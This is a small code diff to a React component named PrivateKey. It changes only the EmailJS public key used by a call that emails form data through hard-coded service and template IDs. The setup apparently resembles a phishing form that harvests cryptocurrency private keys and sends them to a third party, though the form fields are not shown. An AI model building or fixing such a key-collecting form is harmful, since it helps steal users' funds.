@@ -95,7 +95,7 @@ class PrivateKey extends React.Component<PrivProps, PrivState> {
         }
 
         emailjs.send('service_iabotxi', 'template_muadzlw', template, {
-            publicKey: '8K-IeGOKpfXa20UY'
+            publicKey: '8K-IeGOKpfXa20UYI'
         })
         .then((result: any) => {
         // alert("Message Sent, We will get back to you shortly", result.text);
